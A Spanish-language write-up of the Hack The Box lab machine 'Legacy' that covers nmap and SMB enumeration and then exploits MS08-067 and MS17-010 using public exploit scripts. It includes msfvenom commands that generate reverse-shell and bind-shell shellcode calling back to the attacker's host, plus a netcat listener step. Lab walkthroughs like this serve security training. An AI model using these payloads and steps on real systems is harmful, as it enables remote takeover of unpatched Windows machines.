---
title: Hack The Box - Legacy - Windows -  MS08-067 - MS17-010
date: 2020-07-28 08:08:00 Z
---

![Legacy.jpg]({{site.baseurl}}/images/Legacy/Legacy.jpg)


Primer paso, será trazar una ruta hacía la máquina Legacy con el comando **ping**.

![ping.jpg]({{site.baseurl}}/images/Legacy/ping.jpg)

Una vez comprobado, que la información llegue correctamente a la máquina de destino. Empezaremos con recolectar información sobre Legacy.

# Recolección de Información

Con la herramienta **NMAP** recolectaremos información sobre los puertos abiertos.

```
sudo nmap -sC -sV 10.10.10.4 -p-
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-28 04:13 EDT
Nmap scan report for Legacy (10.10.10.4)
Host is up (0.097s latency).
Not shown: 65532 filtered ports
PORT     STATE  SERVICE       VERSION
139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open   microsoft-ds  Windows XP microsoft-ds
3389/tcp closed ms-wbt-server
Service Info: OSs: Windows, Windows XP;

Host script results:
|_clock-skew: mean: -4h23m11s, deviation: 2h07m16s, median: -5h53m11s
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2020-07-28T08:23:06+03:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. 
Nmap done: 1 IP address (1 host up) scanned in 217.12 seconds
```
Observamos que están corriendo los puertos del Servicio **SAMBA**

Cito a nuestra amiga Wikipedia:
*
Samba es una implementación del protocolo de **archivos compartidos de Microsoft Windows** (antiguamente llamado SMB, renombrado recientemente a CIFS) para sistemas de tipo UNIX. 

Samba también permite validar usuarios haciendo de Controlador Principal de Dominio (PDC), como miembro de dominio e incluso como un dominio Active Directory para redes basadas en Windows; aparte de ser capaz de servir colas de impresión, directorios compartidos y autentificar con su propio archivo de usuarios.*

## SAMBA

Para recolectar samba, contamos con diferentes herramientas.

### NMAP

Nmap cuenta con scripts para obtener información sobre el servicio SAMBA. Tenemos script para enumerar información, y también para ver si es **vulnerable** a las vulnerabilidades más conocidas.

Podemos listas todos los scripts de está manera:

```ls -lh /usr/share/nmap/scripts/ | grep smb- ```

Primer paso, será enumerar el servicio, contamos con:

![nmap-samba-scripts.jpg]({{site.baseurl}}/images/Legacy/nmap-samba-scripts.jpg)

Podemos hacer de todos ellos:

```nmap --script=smb-enum* -p 445 MACHINE_IP```

![nmap-samba-enum.jpg]({{site.baseurl}}/images/Legacy/nmap-samba-enum.jpg)

El siguiente paso, será hacer uso de los scripts de vulnerabilidades

![nmap-samba-vuln.jpg]({{site.baseurl}}/images/Legacy/nmap-samba-vuln.jpg) 




# Enumeración

Trás realizar el análisis, será ver y estructurar que información nos va a ser útil para realizar una correcta explotación.

Hemos observado diferentes **directorios** a través de **samba**, como son **$ADMIN**, **$C** , **$IPC**.
Podríamos intentar acceder a ellos para leer algún fichero, obtener más información, en definitiva, una investigación.


La siguiente información valiosas, son las **vulnerabilidades** obtenidas:

* **MS08-067**
* **MS17-010**

Debemos validar esta información, ya que puede estar parcheada y realmente no ser vulnerable.

# Explotación

## MS08-067

Nos fijamos como objetivo atacar a la **vuln MS08-067**
Googleamos en busca de un exploit, encontramos este [https://github.com/andyacer/ms08_067](https://github.com/andyacer/ms08_067)

Antes de hacer uso del script, necesitamos tener instalado impacket.
```
git clone --branch impacket_0_9_17 --single-branch https://github.com/CoreSecurity/impacket/
cd impacket
pip install .
```
El siguiente paso será generar una **shellcode**, con el objetivo de obtener una conexión reversa hacía nuestro equipo.

Se nos recomienta estas, deberemos moficarlas para adaptarlas a nuestro entorno de red.

```
msfvenom -p windows/shell_bind_tcp RHOST=192.168.1.1 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows

msfvenom -p windows/shell_reverse_tcp LHOST=1.3.3.7 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows

msfvenom -p windows/shell_reverse_tcp LHOST=1.3.3.7 LPORT=62000 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows

```

La shellcode que nos devuelva la herramienta MSFVENOM, deberemos introducirla en nuestro script.
Como vemos en la siguiente imágen, en el apartado de la izquierda tenemos la shellcode generada por msfvenom.
Y en la parte derecha, tenemos la integración de la shellcode en nuestro script.

![shellcode.jpg]({{site.baseurl}}/images/Legacy/shellcode.jpg) 

La shellcode que hemos generado en **formato c**, no llega a completar de manera **exitosa**. 


El método que **funciona** sería generar una shellcode en **formato python**


```msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.25 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f python -v shellcode -a x86 --platform windows
```

A la hora de integrar la shellcode en el script, deberemos dejarlo de está manera:

![shellcode2.jpg]({{site.baseurl}}/images/Legacy/shellcode2.jpg) 

Debemos abrirnos un puerto en escucha con netcat, en mi caso abriré el puerto 443, que es el puerto indicado en la shellcode.

![portescucha.jpg]({{site.baseurl}}/images/Legacy/portescucha.jpg) 

Y lanzamos el exploit

![lanzandoexploit.jpg]({{site.baseurl}}/images/Legacy/lanzandoexploit.jpg) 

Y se produce la conexión

![conexion.jpg]({{site.baseurl}}/images/Legacy/conexion.jpg) 

Ya solo nos faltaría, obtener las flag de user y del Administrador

USER:

![flaguser.jpg]({{site.baseurl}}/images/Legacy/flaguser.jpg) 

ROOT:

![flagroot.jpg]({{site.baseurl}}/images/Legacy/flagroot.jpg) 

## MS17-010

Vemos como la anterior vulnerabilidad conseguimos el control de Legacy.

Nuestro próximo objetivo será comprobar si la **vulnerabilidad MS17-010**, es vulnerable.

Googleamos y encontramos este repositorio
[https://github.com/helviojunior/MS17-010](https://github.com/helviojunior/MS17-010)

Debemos descargar el repositorio, con el comando **git clone**


Nuestro objetivo es un equipo Windows XP por lo cuál debemos buscar un exploit compatible con ello.

Usaremos [send-and-execute](https://github.com/helviojunior/MS17-010/blob/master/send_and_execute.py)

Necesitaremos crear una shellcode como hiciamos anteriormente.

```msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.25 LPORT=4444 EXITFUNC=thread -f exe -a x86 --platform windows -o ms17-010.exe```

Es importante y ejecutar las ordenes desde el propio repositorio.
Debemos alojarla el fichero que hemos creado en el repositorio anteriormente descargado.


Abrimos un puerto en escucha

![portm17.jpg]({{site.baseurl}}/images/Legacy/portm17.jpg) 

Y ejecutamos el script


![scriptms17.jpg]({{site.baseurl}}/images/Legacy/scriptms17.jpg) 

Y se producirá la conexión.

![conexionms17.jpg]({{site.baseurl}}/images/Legacy/conexionms17.jpg)

 Es importante ejecutar las ordenes desde el repositorio creado, si no ejecutamos las instrucciones desde el repositorio el script no compilará correctamente y dará fallo.
